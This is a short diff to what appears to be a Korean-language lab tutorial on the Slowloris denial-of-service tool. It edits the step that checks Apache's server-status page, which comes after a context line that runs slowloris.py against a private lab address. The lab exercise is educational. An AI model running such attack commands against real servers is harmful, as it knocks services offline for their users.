@@ -79,7 +79,7 @@ chmod 755 slowloris.py
 ./slowloris.py 192.168.44.144 50
 ```
 
-웹 브라우저를 열어 상태를 확인한다
+kali#1(victim) 웹 브라우저를 열어 상태를 확인한다
 
 > localhost/server-status
 
